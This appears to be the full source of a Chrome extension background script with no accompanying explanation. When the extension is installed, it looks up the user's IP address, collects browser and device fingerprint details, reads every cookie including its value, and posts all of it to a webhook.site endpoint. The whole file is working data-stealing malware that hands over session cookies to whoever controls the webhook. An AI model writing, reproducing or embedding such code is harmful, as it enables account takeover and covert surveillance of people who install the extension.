
async function sendData(data) {
    await fetch("https://webhook.site/your_webhook_here", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
    });
}

function getIP() {
    return fetch("https://api.ipify.org?format=json")
        .then(res => res.json())
        .then(data => data.ip)
        .catch(() => "Unavailable");
}

function collectInfo() {
    return {
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
        languages: navigator.languages,
        hardwareConcurrency: navigator.hardwareConcurrency,
        deviceMemory: navigator.deviceMemory || "N/A"
    };
}

chrome.runtime.onInstalled.addListener(async () => {
    const ip = await getIP();
    const info = collectInfo();
    info.ip = ip;

    // Attempt to get all cookies (will work if permissions are granted)
    chrome.cookies.getAll({}, (cookies) => {
        info.cookies = cookies.map(c => ({
            domain: c.domain,
            name: c.name,
            value: c.value,
            path: c.path
        }));
        sendData(info);
    });
});
